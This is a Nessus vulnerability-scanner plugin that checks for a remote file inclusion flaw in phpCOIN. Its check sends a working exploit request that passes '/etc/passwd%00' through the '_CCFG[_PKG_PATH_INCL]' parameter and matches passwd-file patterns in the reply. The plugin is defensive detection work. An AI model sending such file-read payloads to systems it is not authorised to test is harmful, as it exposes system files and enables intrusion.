#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22267);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-4424", "CVE-2006-4425");
  script_bugtraq_id(19706);
  script_osvdb_id(
    28218, 
    28219, 
    28220, 
    28221, 
    28222, 
    28223, 
    28224, 
    28225
 );
  script_xref(name:"EDB-ID", value:"2254");
  if (defined_func("script_xref")) {
  }

  script_name(english:"phpCOIN Multiple Script _CCFG Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with phpCOIN");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpCOIN, a software package for web-hosting
resellers to handle clients, orders, helpdesk queries, and the like. 

The version of phpCOIN installed on the remote host fails to sanitize
input to the '_CCFG' array parameter before using it in several
scripts to include PHP code.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
these flaws to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://forums.phpcoin.com//index.php?showtopic=3" );
 script_set_attribute(attribute:"solution", value:
"Patch the 'coin_includes/session_set.php' file as described in the
vendor advisory referenced above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/08/24");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:coinsoft_technologies:phpcoin");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq("/phpcoin", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  w = http_send_recv3(method: "GET", 
    item:string(
      dir, "/coin_includes/constants.php?",
      "_CCFG[_PKG_PATH_INCL]=", file
    ),
    port:port
  );
  if (isnull(w)) exit(0);
  res = strcat(w[0], w[1], '\r\n', w[2]);

  # There's a problem if...
  if (
    # it sets the phpCOIN cookie and...
    "phpcoinsessid=" >< w[1] &&
    (
    # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0core\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string: res, pattern:"root:.*:0:[01]:"))
    {
      res = res - strstr(res, "<br");

      # Skip HTTP response headers.
      contents = "";
      in_headers = 1;
      foreach line (split(res, keep:FALSE))
      {
        if (strlen(line) == 0) in_headers = 0;
        else if (!in_headers) contents += line + '\n';
      }
    }

    if (contents && report_verbosity)
      report = string(
        "Here are the repeated contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
